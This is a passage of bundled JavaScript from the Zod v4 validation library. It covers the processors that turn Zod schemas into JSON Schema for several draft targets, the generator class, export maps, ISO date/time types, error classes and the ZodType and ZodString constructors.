    json.minimum = minimum;
    if (typeof exclusiveMinimum === "number" && ctx.target !== "draft-04") {
      if (exclusiveMinimum >= minimum)
        delete json.minimum;
      else
        delete json.exclusiveMinimum;
    }
  }
  if (typeof exclusiveMaximum === "number") {
    if (ctx.target === "draft-04" || ctx.target === "openapi-3.0") {
      json.maximum = exclusiveMaximum;
      json.exclusiveMaximum = true;
    } else {
      json.exclusiveMaximum = exclusiveMaximum;
    }
  }
  if (typeof maximum === "number") {
    json.maximum = maximum;
    if (typeof exclusiveMaximum === "number" && ctx.target !== "draft-04") {
      if (exclusiveMaximum <= maximum)
        delete json.maximum;
      else
        delete json.exclusiveMaximum;
    }
  }
  if (typeof multipleOf === "number")
    json.multipleOf = multipleOf;
};
var booleanProcessor = (_schema, _ctx, json, _params) => {
  json.type = "boolean";
};
var bigintProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("BigInt cannot be represented in JSON Schema");
  }
};
var symbolProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("Symbols cannot be represented in JSON Schema");
  }
};
var nullProcessor = (_schema, ctx, json, _params) => {
  if (ctx.target === "openapi-3.0") {
    json.type = "string";
    json.nullable = true;
    json.enum = [null];
  } else {
    json.type = "null";
  }
};
var undefinedProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("Undefined cannot be represented in JSON Schema");
  }
};
var voidProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("Void cannot be represented in JSON Schema");
  }
};
var neverProcessor = (_schema, _ctx, json, _params) => {
  json.not = {};
};
var anyProcessor = (_schema, _ctx, _json, _params) => {};
var unknownProcessor = (_schema, _ctx, _json, _params) => {};
var dateProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("Date cannot be represented in JSON Schema");
  }
};
var enumProcessor = (schema, _ctx, json, _params) => {
  const def = schema._zod.def;
  const values = getEnumValues(def.entries);
  if (values.every((v) => typeof v === "number"))
    json.type = "number";
  if (values.every((v) => typeof v === "string"))
    json.type = "string";
  json.enum = values;
};
var literalProcessor = (schema, ctx, json, _params) => {
  const def = schema._zod.def;
  const vals = [];
  for (const val of def.values) {
    if (val === undefined) {
      if (ctx.unrepresentable === "throw") {
        throw new Error("Literal `undefined` cannot be represented in JSON Schema");
      } else {}
    } else if (typeof val === "bigint") {
      if (ctx.unrepresentable === "throw") {
        throw new Error("BigInt literals cannot be represented in JSON Schema");
      } else {
        vals.push(Number(val));
      }
    } else {
      vals.push(val);
    }
  }
  if (vals.length === 0) {} else if (vals.length === 1) {
    const val = vals[0];
    json.type = val === null ? "null" : typeof val;
    if (ctx.target === "draft-04" || ctx.target === "openapi-3.0") {
      json.enum = [val];
    } else {
      json.const = val;
    }
  } else {
    if (vals.every((v) => typeof v === "number"))
      json.type = "number";
    if (vals.every((v) => typeof v === "string"))
      json.type = "string";
    if (vals.every((v) => typeof v === "boolean"))
      json.type = "boolean";
    if (vals.every((v) => v === null))
      json.type = "null";
    json.enum = vals;
  }
};
var nanProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("NaN cannot be represented in JSON Schema");
  }
};
var templateLiteralProcessor = (schema, _ctx, json, _params) => {
  const _json = json;
  const pattern = schema._zod.pattern;
  if (!pattern)
    throw new Error("Pattern not found in template literal");
  _json.type = "string";
  _json.pattern = pattern.source;
};
var fileProcessor = (schema, _ctx, json, _params) => {
  const _json = json;
  const file = {
    type: "string",
    format: "binary",
    contentEncoding: "binary"
  };
  const { minimum, maximum, mime } = schema._zod.bag;
  if (minimum !== undefined)
    file.minLength = minimum;
  if (maximum !== undefined)
    file.maxLength = maximum;
  if (mime) {
    if (mime.length === 1) {
      file.contentMediaType = mime[0];
      Object.assign(_json, file);
    } else {
      Object.assign(_json, file);
      _json.anyOf = mime.map((m) => ({ contentMediaType: m }));
    }
  } else {
    Object.assign(_json, file);
  }
};
var successProcessor = (_schema, _ctx, json, _params) => {
  json.type = "boolean";
};
var customProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("Custom types cannot be represented in JSON Schema");
  }
};
var functionProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("Function types cannot be represented in JSON Schema");
  }
};
var transformProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("Transforms cannot be represented in JSON Schema");
  }
};
var mapProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("Map cannot be represented in JSON Schema");
  }
};
var setProcessor = (_schema, ctx, _json, _params) => {
  if (ctx.unrepresentable === "throw") {
    throw new Error("Set cannot be represented in JSON Schema");
  }
};
var arrayProcessor = (schema, ctx, _json, params) => {
  const json = _json;
  const def = schema._zod.def;
  const { minimum, maximum } = schema._zod.bag;
  if (typeof minimum === "number")
    json.minItems = minimum;
  if (typeof maximum === "number")
    json.maxItems = maximum;
  json.type = "array";
  json.items = process2(def.element, ctx, { ...params, path: [...params.path, "items"] });
};
var objectProcessor = (schema, ctx, _json, params) => {
  const json = _json;
  const def = schema._zod.def;
  json.type = "object";
  json.properties = {};
  const shape = def.shape;
  for (const key in shape) {
    json.properties[key] = process2(shape[key], ctx, {
      ...params,
      path: [...params.path, "properties", key]
    });
  }
  const allKeys = new Set(Object.keys(shape));
  const requiredKeys = new Set([...allKeys].filter((key) => {
    const v = def.shape[key]._zod;
    if (ctx.io === "input") {
      return v.optin === undefined;
    } else {
      return v.optout === undefined;
    }
  }));
  if (requiredKeys.size > 0) {
    json.required = Array.from(requiredKeys);
  }
  if (def.catchall?._zod.def.type === "never") {
    json.additionalProperties = false;
  } else if (!def.catchall) {
    if (ctx.io === "output")
      json.additionalProperties = false;
  } else if (def.catchall) {
    json.additionalProperties = process2(def.catchall, ctx, {
      ...params,
      path: [...params.path, "additionalProperties"]
    });
  }
};
var unionProcessor = (schema, ctx, json, params) => {
  const def = schema._zod.def;
  const isExclusive = def.inclusive === false;
  const options = def.options.map((x, i) => process2(x, ctx, {
    ...params,
    path: [...params.path, isExclusive ? "oneOf" : "anyOf", i]
  }));
  if (isExclusive) {
    json.oneOf = options;
  } else {
    json.anyOf = options;
  }
};
var intersectionProcessor = (schema, ctx, json, params) => {
  const def = schema._zod.def;
  const a = process2(def.left, ctx, {
    ...params,
    path: [...params.path, "allOf", 0]
  });
  const b = process2(def.right, ctx, {
    ...params,
    path: [...params.path, "allOf", 1]
  });
  const isSimpleIntersection = (val) => ("allOf" in val) && Object.keys(val).length === 1;
  const allOf = [
    ...isSimpleIntersection(a) ? a.allOf : [a],
    ...isSimpleIntersection(b) ? b.allOf : [b]
  ];
  json.allOf = allOf;
};
var tupleProcessor = (schema, ctx, _json, params) => {
  const json = _json;
  const def = schema._zod.def;
  json.type = "array";
  const prefixPath = ctx.target === "draft-2020-12" ? "prefixItems" : "items";
  const restPath = ctx.target === "draft-2020-12" ? "items" : ctx.target === "openapi-3.0" ? "items" : "additionalItems";
  const prefixItems = def.items.map((x, i) => process2(x, ctx, {
    ...params,
    path: [...params.path, prefixPath, i]
  }));
  const rest = def.rest ? process2(def.rest, ctx, {
    ...params,
    path: [...params.path, restPath, ...ctx.target === "openapi-3.0" ? [def.items.length] : []]
  }) : null;
  if (ctx.target === "draft-2020-12") {
    json.prefixItems = prefixItems;
    if (rest) {
      json.items = rest;
    }
  } else if (ctx.target === "openapi-3.0") {
    json.items = {
      anyOf: prefixItems
    };
    if (rest) {
      json.items.anyOf.push(rest);
    }
    json.minItems = prefixItems.length;
    if (!rest) {
      json.maxItems = prefixItems.length;
    }
  } else {
    json.items = prefixItems;
    if (rest) {
      json.additionalItems = rest;
    }
  }
  const { minimum, maximum } = schema._zod.bag;
  if (typeof minimum === "number")
    json.minItems = minimum;
  if (typeof maximum === "number")
    json.maxItems = maximum;
};
var recordProcessor = (schema, ctx, _json, params) => {
  const json = _json;
  const def = schema._zod.def;
  json.type = "object";
  const keyType = def.keyType;
  const keyBag = keyType._zod.bag;
  const patterns = keyBag?.patterns;
  if (def.mode === "loose" && patterns && patterns.size > 0) {
    const valueSchema = process2(def.valueType, ctx, {
      ...params,
      path: [...params.path, "patternProperties", "*"]
    });
    json.patternProperties = {};
    for (const pattern of patterns) {
      json.patternProperties[pattern.source] = valueSchema;
    }
  } else {
    if (ctx.target === "draft-07" || ctx.target === "draft-2020-12") {
      json.propertyNames = process2(def.keyType, ctx, {
        ...params,
        path: [...params.path, "propertyNames"]
      });
    }
    json.additionalProperties = process2(def.valueType, ctx, {
      ...params,
      path: [...params.path, "additionalProperties"]
    });
  }
  const keyValues = keyType._zod.values;
  if (keyValues) {
    const validKeyValues = [...keyValues].filter((v) => typeof v === "string" || typeof v === "number");
    if (validKeyValues.length > 0) {
      json.required = validKeyValues;
    }
  }
};
var nullableProcessor = (schema, ctx, json, params) => {
  const def = schema._zod.def;
  const inner = process2(def.innerType, ctx, params);
  const seen = ctx.seen.get(schema);
  if (ctx.target === "openapi-3.0") {
    seen.ref = def.innerType;
    json.nullable = true;
  } else {
    json.anyOf = [inner, { type: "null" }];
  }
};
var nonoptionalProcessor = (schema, ctx, _json, params) => {
  const def = schema._zod.def;
  process2(def.innerType, ctx, params);
  const seen = ctx.seen.get(schema);
  seen.ref = def.innerType;
};
var defaultProcessor = (schema, ctx, json, params) => {
  const def = schema._zod.def;
  process2(def.innerType, ctx, params);
  const seen = ctx.seen.get(schema);
  seen.ref = def.innerType;
  json.default = JSON.parse(JSON.stringify(def.defaultValue));
};
var prefaultProcessor = (schema, ctx, json, params) => {
  const def = schema._zod.def;
  process2(def.innerType, ctx, params);
  const seen = ctx.seen.get(schema);
  seen.ref = def.innerType;
  if (ctx.io === "input")
    json._prefault = JSON.parse(JSON.stringify(def.defaultValue));
};
var catchProcessor = (schema, ctx, json, params) => {
  const def = schema._zod.def;
  process2(def.innerType, ctx, params);
  const seen = ctx.seen.get(schema);
  seen.ref = def.innerType;
  let catchValue;
  try {
    catchValue = def.catchValue(undefined);
  } catch {
    throw new Error("Dynamic catch values are not supported in JSON Schema");
  }
  json.default = catchValue;
};
var pipeProcessor = (schema, ctx, _json, params) => {
  const def = schema._zod.def;
  const innerType = ctx.io === "input" ? def.in._zod.def.type === "transform" ? def.out : def.in : def.out;
  process2(innerType, ctx, params);
  const seen = ctx.seen.get(schema);
  seen.ref = innerType;
};
var readonlyProcessor = (schema, ctx, json, params) => {
  const def = schema._zod.def;
  process2(def.innerType, ctx, params);
  const seen = ctx.seen.get(schema);
  seen.ref = def.innerType;
  json.readOnly = true;
};
var promiseProcessor = (schema, ctx, _json, params) => {
  const def = schema._zod.def;
  process2(def.innerType, ctx, params);
  const seen = ctx.seen.get(schema);
  seen.ref = def.innerType;
};
var optionalProcessor = (schema, ctx, _json, params) => {
  const def = schema._zod.def;
  process2(def.innerType, ctx, params);
  const seen = ctx.seen.get(schema);
  seen.ref = def.innerType;
};
var lazyProcessor = (schema, ctx, _json, params) => {
  const innerType = schema._zod.innerType;
  process2(innerType, ctx, params);
  const seen = ctx.seen.get(schema);
  seen.ref = innerType;
};
var allProcessors = {
  string: stringProcessor,
  number: numberProcessor,
  boolean: booleanProcessor,
  bigint: bigintProcessor,
  symbol: symbolProcessor,
  null: nullProcessor,
  undefined: undefinedProcessor,
  void: voidProcessor,
  never: neverProcessor,
  any: anyProcessor,
  unknown: unknownProcessor,
  date: dateProcessor,
  enum: enumProcessor,
  literal: literalProcessor,
  nan: nanProcessor,
  template_literal: templateLiteralProcessor,
  file: fileProcessor,
  success: successProcessor,
  custom: customProcessor,
  function: functionProcessor,
  transform: transformProcessor,
  map: mapProcessor,
  set: setProcessor,
  array: arrayProcessor,
  object: objectProcessor,
  union: unionProcessor,
  intersection: intersectionProcessor,
  tuple: tupleProcessor,
  record: recordProcessor,
  nullable: nullableProcessor,
  nonoptional: nonoptionalProcessor,
  default: defaultProcessor,
  prefault: prefaultProcessor,
  catch: catchProcessor,
  pipe: pipeProcessor,
  readonly: readonlyProcessor,
  promise: promiseProcessor,
  optional: optionalProcessor,
  lazy: lazyProcessor
};
function toJSONSchema(input, params) {
  if ("_idmap" in input) {
    const registry2 = input;
    const ctx2 = initializeContext({ ...params, processors: allProcessors });
    const defs = {};
    for (const entry of registry2._idmap.entries()) {
      const [_, schema] = entry;
      process2(schema, ctx2);
    }
    const schemas = {};
    const external = {
      registry: registry2,
      uri: params?.uri,
      defs
    };
    ctx2.external = external;
    for (const entry of registry2._idmap.entries()) {
      const [key, schema] = entry;
      extractDefs(ctx2, schema);
      schemas[key] = finalize(ctx2, schema);
    }
    if (Object.keys(defs).length > 0) {
      const defsSegment = ctx2.target === "draft-2020-12" ? "$defs" : "definitions";
      schemas.__shared = {
        [defsSegment]: defs
      };
    }
    return { schemas };
  }
  const ctx = initializeContext({ ...params, processors: allProcessors });
  process2(input, ctx);
  extractDefs(ctx, input);
  return finalize(ctx, input);
}
// node_modules/zod/v4/core/json-schema-generator.js
class JSONSchemaGenerator {
  get metadataRegistry() {
    return this.ctx.metadataRegistry;
  }
  get target() {
    return this.ctx.target;
  }
  get unrepresentable() {
    return this.ctx.unrepresentable;
  }
  get override() {
    return this.ctx.override;
  }
  get io() {
    return this.ctx.io;
  }
  get counter() {
    return this.ctx.counter;
  }
  set counter(value) {
    this.ctx.counter = value;
  }
  get seen() {
    return this.ctx.seen;
  }
  constructor(params) {
    let normalizedTarget = params?.target ?? "draft-2020-12";
    if (normalizedTarget === "draft-4")
      normalizedTarget = "draft-04";
    if (normalizedTarget === "draft-7")
      normalizedTarget = "draft-07";
    this.ctx = initializeContext({
      processors: allProcessors,
      target: normalizedTarget,
      ...params?.metadata && { metadata: params.metadata },
      ...params?.unrepresentable && { unrepresentable: params.unrepresentable },
      ...params?.override && { override: params.override },
      ...params?.io && { io: params.io }
    });
  }
  process(schema, _params = { path: [], schemaPath: [] }) {
    return process2(schema, this.ctx, _params);
  }
  emit(schema, _params) {
    if (_params) {
      if (_params.cycles)
        this.ctx.cycles = _params.cycles;
      if (_params.reused)
        this.ctx.reused = _params.reused;
      if (_params.external)
        this.ctx.external = _params.external;
    }
    extractDefs(this.ctx, schema);
    const result = finalize(this.ctx, schema);
    const { "~standard": _, ...plainResult } = result;
    return plainResult;
  }
}
// node_modules/zod/v4/core/json-schema.js
var exports_json_schema = {};
// node_modules/zod/v4/classic/schemas.js
var exports_schemas2 = {};
__export(exports_schemas2, {
  xor: () => xor,
  xid: () => xid2,
  void: () => _void2,
  uuidv7: () => uuidv7,
  uuidv6: () => uuidv6,
  uuidv4: () => uuidv4,
  uuid: () => uuid2,
  url: () => url,
  unknown: () => unknown,
  union: () => union,
  undefined: () => _undefined3,
  ulid: () => ulid2,
  uint64: () => uint64,
  uint32: () => uint32,
  tuple: () => tuple,
  transform: () => transform,
  templateLiteral: () => templateLiteral,
  symbol: () => symbol,
  superRefine: () => superRefine,
  success: () => success,
  stringbool: () => stringbool,
  stringFormat: () => stringFormat,
  string: () => string2,
  strictObject: () => strictObject,
  set: () => set,
  refine: () => refine,
  record: () => record,
  readonly: () => readonly,
  promise: () => promise,
  preprocess: () => preprocess,
  prefault: () => prefault,
  pipe: () => pipe,
  partialRecord: () => partialRecord,
  optional: () => optional,
  object: () => object,
  number: () => number2,
  nullish: () => nullish2,
  nullable: () => nullable,
  null: () => _null3,
  nonoptional: () => nonoptional,
  never: () => never,
  nativeEnum: () => nativeEnum,
  nanoid: () => nanoid2,
  nan: () => nan,
  meta: () => meta2,
  map: () => map,
  mac: () => mac2,
  looseRecord: () => looseRecord,
  looseObject: () => looseObject,
  literal: () => literal,
  lazy: () => lazy,
  ksuid: () => ksuid2,
  keyof: () => keyof,
  jwt: () => jwt,
  json: () => json,
  ipv6: () => ipv62,
  ipv4: () => ipv42,
  intersection: () => intersection,
  int64: () => int64,
  int32: () => int32,
  int: () => int,
  instanceof: () => _instanceof,
  httpUrl: () => httpUrl,
  hostname: () => hostname2,
  hex: () => hex2,
  hash: () => hash,
  guid: () => guid2,
  function: () => _function,
  float64: () => float64,
  float32: () => float32,
  file: () => file,
  exactOptional: () => exactOptional,
  enum: () => _enum2,
  emoji: () => emoji2,
  email: () => email2,
  e164: () => e1642,
  discriminatedUnion: () => discriminatedUnion,
  describe: () => describe2,
  date: () => date3,
  custom: () => custom,
  cuid2: () => cuid22,
  cuid: () => cuid3,
  codec: () => codec,
  cidrv6: () => cidrv62,
  cidrv4: () => cidrv42,
  check: () => check,
  catch: () => _catch2,
  boolean: () => boolean2,
  bigint: () => bigint2,
  base64url: () => base64url2,
  base64: () => base642,
  array: () => array,
  any: () => any,
  _function: () => _function,
  _default: () => _default2,
  _ZodString: () => _ZodString,
  ZodXor: () => ZodXor,
  ZodXID: () => ZodXID,
  ZodVoid: () => ZodVoid,
  ZodUnknown: () => ZodUnknown,
  ZodUnion: () => ZodUnion,
  ZodUndefined: () => ZodUndefined,
  ZodUUID: () => ZodUUID,
  ZodURL: () => ZodURL,
  ZodULID: () => ZodULID,
  ZodType: () => ZodType,
  ZodTuple: () => ZodTuple,
  ZodTransform: () => ZodTransform,
  ZodTemplateLiteral: () => ZodTemplateLiteral,
  ZodSymbol: () => ZodSymbol,
  ZodSuccess: () => ZodSuccess,
  ZodStringFormat: () => ZodStringFormat,
  ZodString: () => ZodString,
  ZodSet: () => ZodSet,
  ZodRecord: () => ZodRecord,
  ZodReadonly: () => ZodReadonly,
  ZodPromise: () => ZodPromise,
  ZodPrefault: () => ZodPrefault,
  ZodPipe: () => ZodPipe,
  ZodOptional: () => ZodOptional,
  ZodObject: () => ZodObject,
  ZodNumberFormat: () => ZodNumberFormat,
  ZodNumber: () => ZodNumber,
  ZodNullable: () => ZodNullable,
  ZodNull: () => ZodNull,
  ZodNonOptional: () => ZodNonOptional,
  ZodNever: () => ZodNever,
  ZodNanoID: () => ZodNanoID,
  ZodNaN: () => ZodNaN,
  ZodMap: () => ZodMap,
  ZodMAC: () => ZodMAC,
  ZodLiteral: () => ZodLiteral,
  ZodLazy: () => ZodLazy,
  ZodKSUID: () => ZodKSUID,
  ZodJWT: () => ZodJWT,
  ZodIntersection: () => ZodIntersection,
  ZodIPv6: () => ZodIPv6,
  ZodIPv4: () => ZodIPv4,
  ZodGUID: () => ZodGUID,
  ZodFunction: () => ZodFunction,
  ZodFile: () => ZodFile,
  ZodExactOptional: () => ZodExactOptional,
  ZodEnum: () => ZodEnum,
  ZodEmoji: () => ZodEmoji,
  ZodEmail: () => ZodEmail,
  ZodE164: () => ZodE164,
  ZodDiscriminatedUnion: () => ZodDiscriminatedUnion,
  ZodDefault: () => ZodDefault,
  ZodDate: () => ZodDate,
  ZodCustomStringFormat: () => ZodCustomStringFormat,
  ZodCustom: () => ZodCustom,
  ZodCodec: () => ZodCodec,
  ZodCatch: () => ZodCatch,
  ZodCUID2: () => ZodCUID2,
  ZodCUID: () => ZodCUID,
  ZodCIDRv6: () => ZodCIDRv6,
  ZodCIDRv4: () => ZodCIDRv4,
  ZodBoolean: () => ZodBoolean,
  ZodBigIntFormat: () => ZodBigIntFormat,
  ZodBigInt: () => ZodBigInt,
  ZodBase64URL: () => ZodBase64URL,
  ZodBase64: () => ZodBase64,
  ZodArray: () => ZodArray,
  ZodAny: () => ZodAny
});

// node_modules/zod/v4/classic/checks.js
var exports_checks2 = {};
__export(exports_checks2, {
  uppercase: () => _uppercase,
  trim: () => _trim,
  toUpperCase: () => _toUpperCase,
  toLowerCase: () => _toLowerCase,
  startsWith: () => _startsWith,
  slugify: () => _slugify,
  size: () => _size,
  regex: () => _regex,
  property: () => _property,
  positive: () => _positive,
  overwrite: () => _overwrite,
  normalize: () => _normalize,
  nonpositive: () => _nonpositive,
  nonnegative: () => _nonnegative,
  negative: () => _negative,
  multipleOf: () => _multipleOf,
  minSize: () => _minSize,
  minLength: () => _minLength,
  mime: () => _mime,
  maxSize: () => _maxSize,
  maxLength: () => _maxLength,
  lte: () => _lte,
  lt: () => _lt,
  lowercase: () => _lowercase,
  length: () => _length,
  includes: () => _includes,
  gte: () => _gte,
  gt: () => _gt,
  endsWith: () => _endsWith
});

// node_modules/zod/v4/classic/iso.js
var exports_iso = {};
__export(exports_iso, {
  time: () => time2,
  duration: () => duration2,
  datetime: () => datetime2,
  date: () => date2,
  ZodISOTime: () => ZodISOTime,
  ZodISODuration: () => ZodISODuration,
  ZodISODateTime: () => ZodISODateTime,
  ZodISODate: () => ZodISODate
});
var ZodISODateTime = /* @__PURE__ */ $constructor("ZodISODateTime", (inst, def) => {
  $ZodISODateTime.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function datetime2(params) {
  return _isoDateTime(ZodISODateTime, params);
}
var ZodISODate = /* @__PURE__ */ $constructor("ZodISODate", (inst, def) => {
  $ZodISODate.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function date2(params) {
  return _isoDate(ZodISODate, params);
}
var ZodISOTime = /* @__PURE__ */ $constructor("ZodISOTime", (inst, def) => {
  $ZodISOTime.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function time2(params) {
  return _isoTime(ZodISOTime, params);
}
var ZodISODuration = /* @__PURE__ */ $constructor("ZodISODuration", (inst, def) => {
  $ZodISODuration.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function duration2(params) {
  return _isoDuration(ZodISODuration, params);
}

// node_modules/zod/v4/classic/errors.js
var initializer2 = (inst, issues) => {
  $ZodError.init(inst, issues);
  inst.name = "ZodError";
  Object.defineProperties(inst, {
    format: {
      value: (mapper) => formatError(inst, mapper)
    },
    flatten: {
      value: (mapper) => flattenError(inst, mapper)
    },
    addIssue: {
      value: (issue2) => {
        inst.issues.push(issue2);
        inst.message = JSON.stringify(inst.issues, jsonStringifyReplacer, 2);
      }
    },
    addIssues: {
      value: (issues2) => {
        inst.issues.push(...issues2);
        inst.message = JSON.stringify(inst.issues, jsonStringifyReplacer, 2);
      }
    },
    isEmpty: {
      get() {
        return inst.issues.length === 0;
      }
    }
  });
};
var ZodError = $constructor("ZodError", initializer2);
var ZodRealError = $constructor("ZodError", initializer2, {
  Parent: Error
});

// node_modules/zod/v4/classic/parse.js
var parse3 = /* @__PURE__ */ _parse(ZodRealError);
var parseAsync2 = /* @__PURE__ */ _parseAsync(ZodRealError);
var safeParse2 = /* @__PURE__ */ _safeParse(ZodRealError);
var safeParseAsync2 = /* @__PURE__ */ _safeParseAsync(ZodRealError);
var encode2 = /* @__PURE__ */ _encode(ZodRealError);
var decode2 = /* @__PURE__ */ _decode(ZodRealError);
var encodeAsync2 = /* @__PURE__ */ _encodeAsync(ZodRealError);
var decodeAsync2 = /* @__PURE__ */ _decodeAsync(ZodRealError);
var safeEncode2 = /* @__PURE__ */ _safeEncode(ZodRealError);
var safeDecode2 = /* @__PURE__ */ _safeDecode(ZodRealError);
var safeEncodeAsync2 = /* @__PURE__ */ _safeEncodeAsync(ZodRealError);
var safeDecodeAsync2 = /* @__PURE__ */ _safeDecodeAsync(ZodRealError);

// node_modules/zod/v4/classic/schemas.js
var ZodType = /* @__PURE__ */ $constructor("ZodType", (inst, def) => {
  $ZodType.init(inst, def);
  Object.assign(inst["~standard"], {
    jsonSchema: {
      input: createStandardJSONSchemaMethod(inst, "input"),
      output: createStandardJSONSchemaMethod(inst, "output")
    }
  });
  inst.toJSONSchema = createToJSONSchemaMethod(inst, {});
  inst.def = def;
  inst.type = def.type;
  Object.defineProperty(inst, "_def", { value: def });
  inst.check = (...checks2) => {
    return inst.clone(exports_util.mergeDefs(def, {
      checks: [
        ...def.checks ?? [],
        ...checks2.map((ch) => typeof ch === "function" ? { _zod: { check: ch, def: { check: "custom" }, onattach: [] } } : ch)
      ]
    }), {
      parent: true
    });
  };
  inst.with = inst.check;
  inst.clone = (def2, params) => clone(inst, def2, params);
  inst.brand = () => inst;
  inst.register = (reg, meta2) => {
    reg.add(inst, meta2);
    return inst;
  };
  inst.parse = (data, params) => parse3(inst, data, params, { callee: inst.parse });
  inst.safeParse = (data, params) => safeParse2(inst, data, params);
  inst.parseAsync = async (data, params) => parseAsync2(inst, data, params, { callee: inst.parseAsync });
  inst.safeParseAsync = async (data, params) => safeParseAsync2(inst, data, params);
  inst.spa = inst.safeParseAsync;
  inst.encode = (data, params) => encode2(inst, data, params);
  inst.decode = (data, params) => decode2(inst, data, params);
  inst.encodeAsync = async (data, params) => encodeAsync2(inst, data, params);
  inst.decodeAsync = async (data, params) => decodeAsync2(inst, data, params);
  inst.safeEncode = (data, params) => safeEncode2(inst, data, params);
  inst.safeDecode = (data, params) => safeDecode2(inst, data, params);
  inst.safeEncodeAsync = async (data, params) => safeEncodeAsync2(inst, data, params);
  inst.safeDecodeAsync = async (data, params) => safeDecodeAsync2(inst, data, params);
  inst.refine = (check, params) => inst.check(refine(check, params));
  inst.superRefine = (refinement) => inst.check(superRefine(refinement));
  inst.overwrite = (fn) => inst.check(_overwrite(fn));
  inst.optional = () => optional(inst);
  inst.exactOptional = () => exactOptional(inst);
  inst.nullable = () => nullable(inst);
  inst.nullish = () => optional(nullable(inst));
  inst.nonoptional = (params) => nonoptional(inst, params);
  inst.array = () => array(inst);
  inst.or = (arg) => union([inst, arg]);
  inst.and = (arg) => intersection(inst, arg);
  inst.transform = (tx) => pipe(inst, transform(tx));
  inst.default = (def2) => _default2(inst, def2);
  inst.prefault = (def2) => prefault(inst, def2);
  inst.catch = (params) => _catch2(inst, params);
  inst.pipe = (target) => pipe(inst, target);
  inst.readonly = () => readonly(inst);
  inst.describe = (description) => {
    const cl = inst.clone();
    globalRegistry.add(cl, { description });
    return cl;
  };
  Object.defineProperty(inst, "description", {
    get() {
      return globalRegistry.get(inst)?.description;
    },
    configurable: true
  });
  inst.meta = (...args) => {
    if (args.length === 0) {
      return globalRegistry.get(inst);
    }
    const cl = inst.clone();
    globalRegistry.add(cl, args[0]);
    return cl;
  };
  inst.isOptional = () => inst.safeParse(undefined).success;
  inst.isNullable = () => inst.safeParse(null).success;
  inst.apply = (fn) => fn(inst);
  return inst;
});
var _ZodString = /* @__PURE__ */ $constructor("_ZodString", (inst, def) => {
  $ZodString.init(inst, def);
  ZodType.init(inst, def);
  inst._zod.processJSONSchema = (ctx, json, params) => stringProcessor(inst, ctx, json, params);
  const bag = inst._zod.bag;
  inst.format = bag.format ?? null;
  inst.minLength = bag.minimum ?? null;
  inst.maxLength = bag.maximum ?? null;
  inst.regex = (...args) => inst.check(_regex(...args));
  inst.includes = (...args) => inst.check(_includes(...args));
  inst.startsWith = (...args) => inst.check(_startsWith(...args));
  inst.endsWith = (...args) => inst.check(_endsWith(...args));
  inst.min = (...args) => inst.check(_minLength(...args));
  inst.max = (...args) => inst.check(_maxLength(...args));
  inst.length = (...args) => inst.check(_length(...args));
  inst.nonempty = (...args) => inst.check(_minLength(1, ...args));
  inst.lowercase = (params) => inst.check(_lowercase(params));
  inst.uppercase = (params) => inst.check(_uppercase(params));
  inst.trim = () => inst.check(_trim());
  inst.normalize = (...args) => inst.check(_normalize(...args));
  inst.toLowerCase = () => inst.check(_toLowerCase());
  inst.toUpperCase = () => inst.check(_toUpperCase());
  inst.slugify = () => inst.check(_slugify());
});
var ZodString = /* @__PURE__ */ $constructor("ZodString", (inst, def) => {
  $ZodString.init(inst, def);
  _ZodString.init(inst, def);
  inst.email = (params) => inst.check(_email(ZodEmail, params));
  inst.url = (params) => inst.check(_url(ZodURL, params));
  inst.jwt = (params) => inst.check(_jwt(ZodJWT, params));
  inst.emoji = (params) => inst.check(_emoji2(ZodEmoji, params));
  inst.guid = (params) => inst.check(_guid(ZodGUID, params));
  inst.uuid = (params) => inst.check(_uuid(ZodUUID, params));
  inst.uuidv4 = (params) => inst.check(_uuidv4(ZodUUID, params));
  inst.uuidv6 = (params) => inst.check(_uuidv6(ZodUUID, params));
  inst.uuidv7 = (params) => inst.check(_uuidv7(ZodUUID, params));
  inst.nanoid = (params) => inst.check(_nanoid(ZodNanoID, params));
  inst.guid = (params) => inst.check(_guid(ZodGUID, params));
  inst.cuid = (params) => inst.check(_cuid(ZodCUID, params));
  inst.cuid2 = (params) => inst.check(_cuid2(ZodCUID2, params));
  inst.ulid = (params) => inst.check(_ulid(ZodULID, params));
  inst.base64 = (params) => inst.check(_base64(ZodBase64, params));
  inst.base64url = (params) => inst.check(_base64url(ZodBase64URL, params));
  inst.xid = (params) => inst.check(_xid(ZodXID, params));
  inst.ksuid = (params) => inst.check(_ksuid(ZodKSUID, params));
  inst.ipv4 = (params) => inst.check(_ipv4(ZodIPv4, params));
  inst.ipv6 = (params) => inst.check(_ipv6(ZodIPv6, params));
  inst.cidrv4 = (params) => inst.check(_cidrv4(ZodCIDRv4, params));
  inst.cidrv6 = (params) => inst.check(_cidrv6(ZodCIDRv6, params));
  inst.e164 = (params) => inst.check(_e164(ZodE164, params));
  inst.datetime = (params) => inst.check(datetime2(params));
  inst.date = (params) => inst.check(date2(params));
  inst.time = (params) => inst.check(time2(params));
  inst.duration = (params) => inst.check(duration2(params));
});
function string2(params) {
  return _string(ZodString, params);
}
var ZodStringFormat = /* @__PURE__ */ $constructor("ZodStringFormat", (inst, def) => {
  $ZodStringFormat.init(inst, def);
  _ZodString.init(inst, def);
});
var ZodEmail = /* @__PURE__ */ $constructor("ZodEmail", (inst, def) => {
  $ZodEmail.init(inst, def);
  ZodStringFormat.init(inst, def);
});
function email2(params) {
  return _email(ZodEmail, params);
}
var ZodGUID = /* @__PURE__ */ $constructor("ZodGUID", (inst, def) => {
  $ZodGUID.init(inst, def);
  ZodStringFormat.init(inst, def);
});
